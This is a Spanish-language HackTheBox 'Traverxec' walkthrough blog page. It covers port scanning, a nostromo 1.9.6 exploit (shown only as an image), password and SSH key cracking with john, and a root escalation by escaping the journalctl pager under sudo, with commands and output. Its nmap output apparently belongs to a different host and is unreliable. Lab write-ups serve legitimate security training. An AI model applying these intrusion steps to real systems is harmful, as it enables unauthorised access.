@@ -1,0 +1,343 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        [HackTheBox – Traverxec] Spanish Writeup ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Traverxec Spanish Writeup."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/traverxec-writeup-spanish/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[HackTheBox – Traverxec] Spanish Writeup"/>
+<meta name="twitter:description" content="Traverxec Spanish Writeup."/>
+
+
+
+<meta property="og:title" content="[HackTheBox – Traverxec] Spanish Writeup"/>
+<meta property="og:description" content="Traverxec Spanish Writeup."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/traverxec-writeup-spanish/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2019-11-18T12:55:00+00:00"/>
+<meta property="article:modified_time" content="2019-11-18T12:55:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">[HackTheBox – Traverxec] Spanish Writeup</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2019-11-18
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/spanish/">#Spanish</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/espa%C3%B1ol/">#Español</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/hackthebox/">#HackTheBox</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/writeup/">#Writeup</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/nostromo/">#nostromo</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/python/">#python</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/john/">#john</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/journalctl/">#journalctl</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/logo.png" alt=""/></p>
+<h1 id="valoraciones">Valoraciones:</h1>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/valoraciones.png" alt=""/></p>
+<h1 id="escaneo-de-puertos">Escaneo de puertos:</h1>
+<pre tabindex="0"><code>Nmap scan report for 10.10.10.146
+Host is up (0.10s latency).
+Not shown: 997 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+| 2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+| 256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_ 256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+443/tcp closed https
+</code></pre><h1 id="enumeración">Enumeración</h1>
+<p>Accedemos al servidor web.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/3j4i234n24n24n.png" alt=""/></p>
+<p>Antes de enumerar directorios vemos que al visitar cualquier archivo que no existe nos da esta información:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/3n4i23n5k2n35.png" alt=""/></p>
+<p>Junto con el reporte de nmap, podemos observar que nos hemos topado con un motor llamado nostromo en su versión 1.9.6. Procedemos a buscar exploits a los que ésta versión sea vulnerable.</p>
+<h1 id="explotación">Explotación</h1>
+<p>Con la intención de abstraerme de Metasploit y practicar para el OSCP, busco exploits que no estén relacionados con el mencionado al principio y me encuentro con <a href="https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py" target="_blank">este</a>. Después de analizar la vulnerabilidad decido editar el script para conseguir una pseudo-shell.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/3k423kn4k23.png" alt=""/></p>
+<h5 id="script-final">Script final.</h5>
+<p>De esta pseudo-shell migramos con una reverse shell con nc para trabajar mejor y enumeramos.</p>
+<p>Tras enumerar vemos que el script de enumeración nos saca esto:</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/57mk45k45n7.png" alt=""/></p>
+<p>Si probamos a crackearla con john, en unos segundos nos la sacará.</p>
+<pre tabindex="0"><code>root@jorge:~/Escritorio/HTB Boxes/Traverxec# john --show hash
+?:Nowonly4me
+</code></pre><p>Después de probarla en todos los sitios posibles sin éxito, seguimos enumerando y encuentro este archivo de configuración de nostromo.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/76m86k8nj6knt.png" alt=""/></p>
+<p>Esto nos sirve para acabar intuyendo que hay una carpeta oculta en /home/david que es /public_www, donde se encuentra el backup de las keys ssh de david. Una vez extraídas y crackeadas con john usando previamente ssh2john conseguimos conectarnos y atrapar la primera flag.</p>
+<pre tabindex="0"><code>root@jorge:~/Escritorio/HTB Boxes/Traverxec# john --show id_rsa.crackear
+id_rsa:hunter
+</code></pre><pre tabindex="0"><code>root@jorge:~/Escritorio/HTB Boxes/Traverxec# ssh -i home/david/.ssh/id_rsa david@10.10.10.165
+Enter passphrase for key &#39;home/david/.ssh/id_rsa&#39;:
+Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
+Last login: Sun Nov 17 13:39:11 2019 from 10.10.15.127
+david@traverxec:~$ wc -c user.txt
+33 user.txt
+</code></pre><h1 id="post-explotación">Post-Explotación</h1>
+<p>Dentro de la carpeta /bin del usuario vemos un script con este contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">!/bin/bash
+cat /home/david/bin/server-stats.head
+echo <span style="color:#e6db74">&#34;Load: /usr/bin/uptime&#34;</span>
+echo <span style="color:#e6db74">&#34; &#34;</span>
+echo <span style="color:#e6db74">&#34;Open nhttpd sockets: /usr/bin/ss -H sport = 80 | /usr/bin/wc -l&#34;</span>
+echo <span style="color:#e6db74">&#34;Files in the docroot: /usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l&#34;</span>
+echo <span style="color:#e6db74">&#34; &#34;</span>
+echo <span style="color:#e6db74">&#34;Last 5 journal log lines:&#34;</span>
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+</code></pre></div><p>Podemos intuir que el usuario está permitido a hacer el último comando como root, por lo que si lo ejecutamos con la ventana de la consola pequeña, hacemos que salte less y escribimos !/bin/bash para que nos de una shell como root.</p>
+<p><img src="https://jorgectf.gitlab.io/blog/static/traverxec/5m6k4n56n45.png" alt=""/></p>
+<p>Conseguimos forzar a que saque el editor.</p>
+<pre tabindex="0"><code>david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Mon 2019-11-18 13:13:00 EST, end at Mon 2019-11-18 13:31:29 EST. --
+Nov 18 13:30:32 traverxec sudo[5763]: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/nostromo ; USER=root ; COMMAND=david
+Nov 18 13:30:36 traverxec sudo[5742]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/14 ruser=www-data rhost= use
+Nov 18 13:30:50 traverxec sudo[5742]: pam_unix(sudo:auth): conversation failed
+Nov 18 13:30:50 traverxec sudo[5742]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Nov 18 13:30:50 traverxec sudo[5742]: www-data : command not allowed ; TTY=pts/14 ; PWD=/tmp ; USER=root ; COMMAND=list
+!/bin/bash
+root@traverxec:/home/david/bin# id
+uid=0(root) gid=0(root) groups=0(root)
+root@traverxec:/home/david/bin# wc -c /root/root.txt
+33 /root/root.txt
+root@traverxec:/home/david/bin#
+</code></pre><p>Si has llegado hasta aquí, gracias por leerme! Nos vemos en el siguiente Writeup.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/lame-writeup-english/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">[HackTheBox – Lame] (OSCP Like) English Writeup</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/networked-writeup-spanish./">
+                  <span class="button__text">[HackTheBox – Networked] Spanish Writeup</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
